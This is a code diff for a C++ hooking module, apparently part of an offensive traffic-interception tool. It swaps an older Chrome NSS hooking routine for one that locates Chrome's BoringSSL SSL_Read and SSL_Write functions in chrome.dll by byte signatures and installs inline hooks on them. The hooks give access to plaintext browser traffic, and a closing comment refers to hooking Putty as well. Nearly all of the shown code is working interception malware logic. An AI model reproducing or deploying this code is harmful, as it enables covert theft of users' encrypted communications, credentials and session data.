@@ -2,131 +2,63 @@
 #include "stdafx.h"
 #include "NonExportedHooks.h"
 
-// Chrome NSS
-
-void HookChromeNSS()
-{
-	SECTION_INFO rdata = {0, 0};
-	SECTION_INFO text  = {0, 0};
-
-	// Specific binary data
-
-	unsigned char SSL_string[] = {'S', 'S', 'L', 0x00, 'A', 'E', 'S'};  // SSL\0
-	unsigned char PSH_string[] = {0x68, 0x00, 0x00, 0x00, 0x00};        // push SSL
-	unsigned char MOV_string[] = {0x4, 0x0, 0x0, 0x0};                  // mov OFFSET, 4
-
-	// Get sections
-
-	rdata = Process::GetModuleSection("chrome.dll", ".rdata");
-	text  = Process::GetModuleSection("chrome.dll", ".text");
-
-	// Check if chrome
-
-	if(rdata.dwSize == 0 || rdata.dwStartAddress == 0 || text.dwSize == 0 || text.dwStartAddress == 0)
-	{
-		DebugLog::Log("[ERROR] Cannot get Chrome sections!");
-		return;
-	}
-
-	// Search memory
-
-	DWORD pSSL = Process::SearchMemory((void *)rdata.dwStartAddress, rdata.dwSize, (void *)SSL_string, 7);
-
-	if(pSSL == 0)
-	{
-		DebugLog::Log("[ERROR] Cannot get Chrome SSL string!");
-		return;
-	}
-
-	memcpy(PSH_string + 1, &pSSL, 4);
-
-	DWORD pPSH = Process::SearchMemory((void *)text.dwStartAddress, text.dwSize, (void *)PSH_string, 5);
-
-	if(pPSH == 0)
-	{
-		DebugLog::Log("[ERROR] Cannot get Chrome PUSH string!");
-		return;
-	}
-
-	DWORD pMOV = Process::SearchMemory((void *)pPSH, 5000, (void *)MOV_string, 4) - 4;
-
-	if(pMOV == 0)
-	{
-		DebugLog::Log("[ERROR] Cannot get Chrome MOV string!");
-		return;
-	}
-
-	// Get function addresses from structure
-
-	DWORD dwStruct = *(DWORD *)pMOV;
-	DWORD pfSSL_Read = *(DWORD *)(dwStruct + 0x8);
-	DWORD pfSSL_Write = *(DWORD *)(dwStruct + 0xC);
-
-	// Add hooks
-
-	SSL_Read_Original = (SSL_Read_Typedef)pfSSL_Read;
-	SSL_Write_Original = (SSL_Write_Typedef)pfSSL_Write;
-
-	Hooker::AddHook((void *)pfSSL_Read, (void *)SSL_Read_Callback);
-	Hooker::AddHook((void *)pfSSL_Write, (void *)SSL_Write_Callback);
-}
-
 // New version of Chrome - BoringSSL
 
-void HookChromeBoring()
+void HookChrome()
 {
 	SECTION_INFO rdata = {0, 0};
 	SECTION_INFO text  = {0, 0};
 
 	// Specific binary data
 
-	unsigned char PSH_string[] = {0x68, 0x00, 0x00, 0x00, 0x00};        // push SSL_string
-	unsigned char SSL_string[] = "c:\\b\\build\\slave\\win\\build\\src\\third_party\\boringssl\\src\\ssl\\ssl_lib.c";
-	const unsigned int nBytesBeforeRead  = 17;
-	const unsigned int nBytesBeforeWrite = 17;
-	const unsigned int READ_IND  = 17;
-	const unsigned int WRITE_IND = 15;
-	
-	// Get sections
+	unsigned char Read_Signature[]  = { 
+		0x55, 0x8B, 0xEC, 0x56, 0x8B, 0x75, 0x08, 0x83, 0x7E, 0x1C, 0x00, 0x75, 0x20, 0x68, 0x54, 0x02, 
+		0x00, 0x00, 0x68, '?', '?', '?', '?', 0x68, 0xE2, 0x00, 0x00, 0x00, 0x6A, 0x00, 0x6A, 0x10, 
+		0xE8, 0x4E, 0xBE, 0xE3, 0xFF, 0x83, 0xC4, 0x14, 0x83, 0xC8, 0xFF, 0xEB, 0x28, 0xF6, 0x46, 0x20, 
+		0x02, 0x74, 0x0B, 0xC7, 0x46, 0x60, 0x01, 0x00, 0x00, 0x00, 0x33, 0xC0, 0xEB, 0x17, 0xE8, 0x23, 
+		0x30, 0xE0, 0xFF, 0x8B, 0x46, 0x08, 0x6A, 0x00, 0xFF, 0x75, 0x10, 0xFF, 0x75, 0x0C, 0x56, 0xFF, 
+		0x50, 0x18, 0x83, 0xC4, 0x10, 0x5E, 0x5D, 0xC3 };
 
-	rdata = Process::GetModuleSection("chrome.dll", ".rdata");
+	unsigned char Write_Signature[] = { 
+		0x55, 0x8B, 0xEC, 0x56, 0x8B, 0x75, 0x08, 0x33, 0xC0, 0x39, 0x46, 0x1C, 0x75, 0x1F, 0x68, 0x71, 
+		0x02, 0x00, 0x00, 0x68, '?', '?', '?', '?', 0x68, 0xE2, 0x00, 0x00, 0x00, 0x50, 0x6A, 0x10, 
+		0xE8, 0xAE, 0xCA, 0xE3, 0xFF, 0x83, 0xC4, 0x14, 0x83, 0xC8, 0xFF, 0xEB, 0x33, 0xF6, 0x46, 0x20, 
+		0x01, 0x74, 0x18, 0x68, 0x77, 0x02, 0x00, 0x00, 0x68, '?', '?', '?', '?', 0xC7, 0x46, 0x60, 
+		0x01, 0x00, 0x00, 0x00, 0x68, 0xC2, 0x00, 0x00, 0x00, 0xEB, 0xD2, 0xE8, 0x76, 0x3C, 0xE0, 0xFF, 
+		0xFF, 0x75, 0x10, 0x8B, 0x46, 0x08, 0xFF, 0x75, 0x0C, 0x56, 0xFF, 0x50, 0x24, 0x83, 0xC4, 0x0C, 
+		0x5E, 0x5D, 0xC3, 0x55, 0x8B, 0xEC, 0xFF, 0x75, 0x10, 0xFF, 0x75, 0x0C, 0x6A, 0x17, 0xFF, 0x75, 
+		0x08, 0xE8, 0xF3, 0x61, 0xE0, 0xFF, 0x83, 0xC4, 0x10, 0x5D, 0xC3 };
+
+	// Get section
+
 	text  = Process::GetModuleSection("chrome.dll", ".text");
 
 	// Check if chrome
 
-	if(rdata.dwSize == 0 || rdata.dwStartAddress == 0 || text.dwSize == 0 || text.dwStartAddress == 0)
+	if(text.dwSize == 0 || text.dwStartAddress == 0)
 	{
-		DebugLog::Log("[ERROR] Cannot get Chrome sections!");
+		DebugLog::Log("[ERROR] Cannot get Chrome text section!");
 		return;
 	}
 
 	// Search memory
 
-	DWORD pSSL = Process::SearchMemory((void *)rdata.dwStartAddress, rdata.dwSize, (void *)SSL_string, 70);
+	DWORD pRead  = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Read_Signature, sizeof(Read_Signature));
+	DWORD pWrite = Process::SearchSignature((void *)text.dwStartAddress, text.dwSize, (void *)Write_Signature, sizeof(Write_Signature));
 
-	if(pSSL == 0)
+	if(pRead == 0 || pWrite == 0)
 	{
-		DebugLog::Log("[ERROR] Cannot get Chrome SSL string!");
+		DebugLog::Log("[ERROR] Cannot get Chrome SSL functions!");
 		return;
 	}
 
-	memcpy(PSH_string + 1, &pSSL, 4);
-
-	DWORD pPSHRead  = Process::SearchMemoryByN((void *)text.dwStartAddress, text.dwSize, (void *)PSH_string, 5, READ_IND);
-	DWORD pPSHWrite = Process::SearchMemoryByN((void *)text.dwStartAddress, text.dwSize, (void *)PSH_string, 5, WRITE_IND);
-
-	// Remove "bytes before" to reach the function start
-
-	pPSHRead  = pPSHRead - nBytesBeforeRead;
-	pPSHWrite = pPSHWrite - nBytesBeforeWrite;
-
 	// Add hooks
 
-	SSL_Read_Original = (SSL_Read_Typedef)pPSHRead;
-	SSL_Write_Original = (SSL_Write_Typedef)pPSHWrite;
+	SSL_Read_Original = (SSL_Read_Typedef)pRead;
+	SSL_Write_Original = (SSL_Write_Typedef)pWrite;
 
-	Hooker::AddHook((void *)pPSHRead, (void *)SSL_Read_Callback);
-	Hooker::AddHook((void *)pPSHWrite, (void *)SSL_Write_Callback);
+	Hooker::AddHook((void *)pRead, (void *)SSL_Read_Callback);
+	Hooker::AddHook((void *)pWrite, (void *)SSL_Write_Callback);
 }
 
 // Hook Putty - (c) PuttyRider - Adrian Furtuna
